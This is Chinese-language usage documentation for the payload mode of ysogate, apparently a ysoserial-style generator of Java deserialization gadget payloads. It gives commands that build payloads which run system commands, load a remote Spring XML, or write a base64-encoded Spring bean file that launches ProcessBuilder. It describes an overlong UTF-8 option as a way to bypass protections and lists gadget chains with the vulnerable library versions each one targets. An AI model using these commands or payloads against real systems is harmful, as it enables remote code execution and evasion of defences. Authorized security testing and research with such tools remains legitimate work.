# Payload Mode

Payload Mode用于生成各种Java反序列化gadget payload。该模式支持多种gadgets和输出格式，可以用于安全测试和漏洞研究。

## 基本用法

```bash
java -jar ysogate-[version]-all.jar -m payload [OPTIONS]
```

## 命令行选项

```bash
[root]#~  Payload Mode Options:
 -b64,--base64           Encode Output into base64
 -f,--file <arg>         Write Output into FileOutputStream (Specified FileName)
 -g,--gadget <arg>       Java deserialization gadget
 -h,--help               Show help message
 -m,--mode <arg>         Operation mode: 'payload' or 'jndi'
 -ol,--overlong          Use overlong UTF-8 encoding
 -p,--parameters <arg>   Gadget parameters
```

## 使用示例

### 基本用法

生成base64编码的payload：

```bash
java -jar ysogate-[version]-all.jar -m payload -g Jackson1 -p "calc" -b64
```

### 使用Overlong UTF-8编码

```bash
java -jar ysogate-[version]-all.jar -m payload -g Jackson1 -p "calc" -b64 -ol
```

### 保存到文件

```bash
java -jar ysogate-[version]-all.jar -m payload -g Jackson1 -p "calc" -f payload.ser
```

### SpringAOP利用链示例

```bash
# 加载字节码执行命令
java -jar ysogate-[version]-all.jar -m payload -g SpringAOPWithTemplates -p "notepad" -b64

# 加载远程XML
java -jar ysogate-[version]-all.jar -m payload -g SpringAOPWithXml -p "http://127.0.0.1:8000/666" -b64

# 写文件（包含XML内容）
java -jar ysogate-[version]-all.jar -m payload -g SpringAOPWithFileWrite -p "/tmp/evil.xml;PGJlYW5zIHhtbG5zPSJodHRwOi8vd3d3LnNwcmluZ2ZyYW1ld29yay5vcmcvc2NoZW1hL2JlYW5zIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4c2k6c2NoZW1hTG9jYXRpb249Imh0dHA6Ly93d3cuc3ByaW5nZnJhbWV3b3JrLm9yZy9zY2hlbWEvYmVhbnMgaHR0cDovL3d3dy5zcHJpbmdmcmFtZXdvcmsub3JnL3NjaGVtYS9iZWFucy9zcHJpbmctYmVhbnMueHNkIj4NCiAgPGJlYW4gaWQ9InBiIiBjbGFzcz0iamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyIiBpbml0LW1ldGhvZD0ic3RhcnQiPg0KICAgIDxjb25zdHJ1Y3Rvci1hcmc+DQogICAgICA8bGlzdD4NCiAgICAgICAgPHZhbHVlPmNhbGM8L3ZhbHVlPg0KICAgICAgPC9saXN0Pg0KICAgIDwvY29uc3RydWN0b3ItYXJnPg0KICA8L2JlYW4+DQo8L2JlYW5zPg==" -b64
```

## 支持的Payload类型

以下是可以使用的payload类型及其依赖：

     Payload                                     Dependencies
     -------                                     ------------
     AspectJWeaver                               aspectjweaver:1.9.2, commons-collections:3.2.2
     AspectJWeaver2                              aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1                                  bsh:2.0b5
     BeanShell20b4                               bsh:2.0b4
     C3P0                                        c3p0:0.9.5.2, mchange-commons-java:0.2.11
     C3P02                                       c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35
     C3P03                                       c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35, groovy:2.3.9
     C3P04                                       c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35, snakeyaml:1.30
     C3P092                                      c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8, mchange-commons-java:0.2.11
     Click1                                      click-nodeps:2.3.0, javax.servlet-api:3.1.0
     Clojure                                     clojure:1.8.0
     CommonsBeanutils1                           commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsBeanutils1183NOCC                    commons-beanutils:1.8.3
     CommonsBeanutils2                           commons-beanutils:1.9.2
     CommonsBeanutils2183NOCC                    commons-beanutils:1.8.3, commons-logging:1.2
     CommonsBeanutils3                           commons-beanutils:1.9.2, commons-collections:3.1
     CommonsBeanutils3183                        commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsBeanutils4                           commons-beanutils:1.9.2, commons-collections:3.1
     CommonsBeanutilsAttrCompare                 commons-beanutils:1.9.2
     CommonsBeanutilsAttrCompare183              commons-beanutils:1.8.3
     CommonsBeanutilsObjectToStringComparator    commons-beanutils:1.9.2, commons-lang3:3.10
     CommonsBeanutilsObjectToStringComparator183 commons-beanutils:1.8.3, commons-lang3:3.10
     CommonsBeanutilsPropertySource              commons-beanutils:1.9.2, log4j-core:2.17.1
     CommonsBeanutilsPropertySource183           commons-beanutils:1.9.2, log4j-core:2.17.1
     CommonsCollections1                         commons-collections:3.1
     CommonsCollections10                        commons-collections:3.2.1
     CommonsCollections11
     CommonsCollections12                        commons-collections:3.2.1
     CommonsCollections2                         commons-collections4:4.0
     CommonsCollections3                         commons-collections:3.1
     CommonsCollections4                         commons-collections4:4.0
     CommonsCollections5                         commons-collections:3.1
     CommonsCollections6                         commons-collections:3.1
     CommonsCollections6Lite                     commons-collections:3.1
     CommonsCollections7                         commons-collections:3.1
     CommonsCollections8                         commons-collections4:4.0
     CommonsCollections9                         commons-collections:3.2.1
     CommonsCollectionsK1                        commons-collections:<=3.2.1
     CommonsCollectionsK2                        commons-collections4:4.0
     Fastjson1                                   <=1.2.xx
     Fastjson2                                   <=2.0.26?
     FileUpload1                                 commons-fileupload:1.3.1, commons-io:2.4
     Groovy1                                     groovy:2.3.9
     Hibernate1                                  hibernate-core:4.3.11.Final, aopalliance:1.0, jboss-logging:3.3.0.Final, javax.transaction-api:1.2, dom4j:1.6.1
     Hibernate2                                  hibernate-core:4.3.11.Final, aopalliance:1.0, jboss-logging:3.3.0.Final, javax.transaction-api:1.2, dom4j:1.6.1
     JBossInterceptors1                          javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRE8u20
     JRE8u20_2
     JRMPClient
     JRMPClient_Activator
     JRMPClient_Obj
     JRMPListener
     JSON1                                       json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     Jackson1                                    jackson-databind:2.14.2, spring-aop:4.1.4.RELEASE
     Jackson2                                    jackson-databind:2.14.2, spring-aop:4.1.4.RELEASE
     JavassistWeld1                              javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21
     Jdk7u21variant
     Jython1                                     jython-standalone:2.5.2
     MozillaRhino1                               js:1.7R2
     MozillaRhino2                               js:1.7R2
     Myfaces1
     Myfaces2                                    myfaces-impl:2.2.9, myfaces-api:2.2.9, apache-el:8.0.27, javax.servlet-api:3.1.0, mockito-core:1.10.19, hamcrest-core:1.1, objenesis:2.1
     ROME                                        rome:1.0
     ROME2                                       rome:1.0
     ROME3                                       rome:1.0
     SignedObject
     Spring1                                     spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2                                     spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     Spring3                                     spring-tx:5.2.3.RELEASE, spring-context:5.2.3.RELEASE, javax.transaction-api:1.2
     URLDNS
     Vaadin1                                     vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1                                     wicket-util:6.23.0, slf4j-api:1.6.4
     XStream39144                                Xstream:<1.4.18
     XStream39149                                Xstream:<1.4.18

## 参数说明

- `-g, --gadget`: 指定要使用的gadget类型
- `-p, --parameters`: 指定gadget的参数，如命令、URL等
- `-b64, --base64`: 将输出编码为base64格式
- `-ol, --overlong`: 使用overlong UTF-8编码绕过防护
- `-f, --file`: 将输出保存到指定文件
- `-h, --help`: 显示帮助信息

## 安全使用说明

⚠️ **重要提醒**：本工具仅面向**合法授权**的安全测试使用，请勿用于非法目的。

使用本工具进行安全测试时，请确保：
1. 已获得目标系统的明确授权
2. 仅在授权范围内进行测试
3. 遵守相关法律法规